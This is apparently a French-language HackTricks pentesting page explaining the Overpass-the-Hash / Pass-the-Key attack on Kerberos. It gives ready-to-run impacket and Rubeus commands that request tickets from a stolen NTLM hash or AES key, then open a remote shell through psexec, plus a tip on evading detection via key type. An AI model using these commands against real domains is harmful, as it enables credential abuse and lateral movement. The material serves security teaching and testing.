# Over Pass the Hash/Pass the Key

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Overpass The Hash/Pass The Key (PTK)

Cette attaque vise à **utiliser le hachage NTLM de l'utilisateur ou les clés AES pour demander des tickets Kerberos**, comme alternative à la technique commune Pass The Hash sur le protocole NTLM. Par conséquent, cela pourrait être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** en tant que protocole d'authentification.

Pour effectuer cette attaque, le **hachage NTLM (ou le mot de passe) du compte utilisateur ciblé est nécessaire**. Ainsi, une fois le hachage utilisateur obtenu, un TGT peut être demandé pour ce compte. Enfin, il est possible d'**accéder** à tout service ou machine **où le compte utilisateur a des autorisations**.
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vous pouvez **spécifier** `-aesKey [clé AES]` pour indiquer l'utilisation de **AES256**.\
Vous pouvez également utiliser le ticket avec d'autres outils tels que : smbexec.py ou wmiexec.py

Problèmes possibles :

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Résolu en mettant à jour impacket vers la dernière version.
* _KDC can’t found the name_ : Résolu en utilisant le nom d'hôte au lieu de l'adresse IP, car il n'était pas reconnu par Kerberos KDC.
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ce type d'attaque est similaire à **Pass the Key**, mais au lieu d'utiliser des hachages pour demander un ticket, le ticket lui-même est volé et utilisé pour s'authentifier en tant que propriétaire.

{% hint style="warning" %}
Lorsqu'un TGT est demandé, l'événement `4768: Un ticket d'authentification Kerberos (TGT) a été demandé` est généré. Vous pouvez voir dans la sortie ci-dessus que le KeyType est **RC4-HMAC** (0x17), mais le type par défaut pour Windows est maintenant **AES256** (0x12).
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Références

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
